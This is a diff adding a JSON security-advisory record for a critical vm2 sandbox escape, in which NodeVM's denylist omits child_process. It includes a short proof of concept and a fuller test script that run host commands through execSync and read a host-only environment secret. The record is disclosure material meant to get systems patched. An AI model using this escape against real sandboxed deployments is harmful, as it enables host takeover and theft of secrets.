@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-10-07T18:05:01Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 507726,
+    "Id": "GSA_kwCzR0hTQS1wcTY4LXJ2dzQteHA0cs4AB79O",
+    "GhsaId": "GHSA-pq68-rvw4-xp4r",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-pq68-rvw4-xp4r"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-93605"
+      },
+      {
+        "Url": "https://www.vulncheck.com/advisories/vm2-nodevm-before-3.12.1-remote-code-execution-via-child-process"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-pq68-rvw4-xp4r"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-pq68-rvw4-xp4r"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-93605"
+      }
+    ],
+    "Description": "vm2 NodeVM versions before 3.12.1 contain a sandbox escape vulnerability where the DANGEROUS_BUILTINS denylist omits child_process despite blocking other host-spawning modules. Attackers can require child_process and execute arbitrary commands on the host system when NodeVM is configured with builtin:['*'] or explicit child_process allowance.\n\nThis fork hardens `NodeVM` with a `DANGEROUS_BUILTINS` denylist that blocks host‑code‑reaching core modules **even when the sandbox requests `builtin:['*']` or names them explicitly** — the list contains `module`, `worker_threads`, `cluster`, `vm`, `repl`, `inspector`, `process`, `trace_events`, `wasi`, `diagnostics_channel`, `async_hooks`, `perf_hooks`, `v8`, `os`, `dns`, and `test`. It **omits `child_process`** — the single most direct command‑execution primitive. As a result, a sandbox running under `require:{builtin:['*']}` (or the fork's own documented `['*','-http','-net',…]` subtract pattern) can `require('child_process').execSync(...)` and execute arbitrary commands on the host. The omission is internally inconsistent: `cluster` is denied with the explicit rationale \"`cluster.fork()` spawns a host child process running attacker‑controlled code,\" yet `child_process` — which spawns host processes more directly — is not.\n\n### Details\n`lib/builtin.js`:\n- `DANGEROUS_BUILTINS` (lines **83‑179**) — the Set of denied builtins. `child_process` does not appear anywhere in it.\n- `isDangerousBuiltin(key)` (lines **185‑195**) — strips `node:` prefixes and applies family‑prefix matching against `DANGEROUS_BUILTINS`. Returns `false` for `child_process`.\n- `BUILTIN_MODULES` (lines **209‑210**) — the source list that the `'*'` wildcard expands to — is `builtinModules.filter(s =\u003e !s.startsWith('internal/') \u0026\u0026 !s.startsWith('_') \u0026\u0026 !isDangerousBuiltin(s))`. Because `isDangerousBuiltin('child_process')` is `false`, `child_process` **remains in `'*'`**.\n- `addDefaultBuiltin` (the explicit‑name path) likewise rejects only `isDangerousBuiltin` names, so `builtin:['child_process']` is admitted as well.\n\nThe module returned is the **real host `child_process`** (default `require.context` is `\"host\"`), so `execSync`/`exec`/`spawn`/`fork` run with full host authority. The denylist's own comment (lines 42‑44) states these primitives \"must NEVER be reachable from the sandbox, even when the user requests `'*'` or explicitly names them\" — the invariant `child_process` violates.\n\n### PoC\n```js\nconst { NodeVM } = require('vm2');\n\nconst r = new NodeVM({ require: { builtin: ['*'] } }).run(`\n  module.exports = require('child_process').execSync('id').toString();\n`, 'plugin.js');\n\nconsole.log(r);   // -\u003e \"uid=1000(user) gid=1000(user) groups=...\"   host command execution\n```\nVerified results:\n| config | `require('child_process')` |\n|---|---|\n| `{ builtin: ['*'] }` | **RCE** — host `id` + host env read |\n| `{ builtin: ['*', '-fs'] }` (documented subtract pattern) | **RCE** — subtracting other modules does not remove it |\n| `{ builtin: ['child_process'] }` | **RCE** — explicit name admitted despite the \"never, even if named\" invariant |\n| `{ builtin: ['fs'] }` (control) | denied — `Cannot find module 'child_process'` |\n\n\n### Impact\nFull host RCE — a complete `NodeVM` sandbox escape — for any deployment that runs untrusted code under `require:{builtin:['*']}` or the documented `['*', '-x', …]` subtract pattern (both of which the fork explicitly supports and hardens), or that explicitly allows `child_process` believing the denylist would reject it as it does the other host‑spawning builtins. The attacker controls only their sandboxed script; the exploit is a single `require('child_process')`.\n\n\n### builtin-child_process-denylist-gap-rce.js\n```js\n'use strict';\n// F-006: vm2 NodeVM DANGEROUS_BUILTINS denylist omits `child_process`.\n// The fork's denylist (lib/builtin.js:83-179) blocks host-code-reaching builtins\n// even under `builtin:['*']` or explicit naming — module, worker_threads,\n// cluster, vm, repl, inspector, process, os, dns, v8, test, ... — but NOT\n// child_process. So `require:{builtin:['*']}` (an allow-all config the fork\n// explicitly hardens) yields direct host RCE. Attacker controls only the\n// sandboxed script.\nconst path = require('path');\nconst { NodeVM } = require(path.resolve(__dirname, '..', 'src', 'vm2', 'lib', 'main.js'));\n\nprocess.env.HOST_ONLY_SECRET = 'CANARY123';   // host-only; sandbox process stub has env:{}\n\nfunction tryConfig(label, opts) {\n  try {\n    const r = new NodeVM({ ...opts, timeout: 2000 }).run(`module.exports = (() =\u003e {\n      try {\n        const cp = require('child_process');\n        return {\n          reached: true,\n          id: cp.execSync('id').toString().trim(),\n          hostSecret: cp.execSync('printenv HOST_ONLY_SECRET').toString().trim()\n        };\n      } catch (e) { return { reached: false, err: String(e.message).slice(0, 60) }; }\n    })()`, 'plugin.js');\n    console.log(label, '=\u003e', JSON.stringify(r));\n    return r;\n  } catch (e) { console.log(label, '=\u003e THREW:', e.message.slice(0, 60)); return null; }\n}\n\nconsole.log('--- child_process reachability by NodeVM require config ---');\nconst a = tryConfig(\"require:{builtin:['*']}        \", { require: { builtin: ['*'] } });\nconst b = tryConfig(\"require:{builtin:['*','-fs']}  \", { require: { builtin: ['*', '-fs'] } });   // documented subtract pattern\nconst c = tryConfig(\"require:{builtin:['fs']} (ctl) \", { require: { builtin: ['fs'] } });          // control: not allowed -\u003e denied\n\nconst ok = a \u0026\u0026 a.reached \u0026\u0026 /uid=/.test(a.id) \u0026\u0026 a.hostSecret === 'CANARY123'\n        \u0026\u0026 b \u0026\u0026 b.reached\n        \u0026\u0026 c \u0026\u0026 c.reached === false;\nconsole.log(ok\n  ? \"\\n\u003e\u003e\u003e CONFIRMED: builtin:['*'] gives host RCE via child_process (denylist gap); control denies it when not allowed\"\n  : \"\\n\u003e\u003e\u003e NOT confirmed\");\nprocess.exit(ok ? 42 : 1);\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-07T18:05:00Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 contains a sandbox escape vulnerability",
+    "UpdatedAt": "2026-10-07T18:05:01Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.12.1"
+      },
+      "VulnerableVersionRange": "\u003c= 3.12.0"
+    }
+  ]
+}
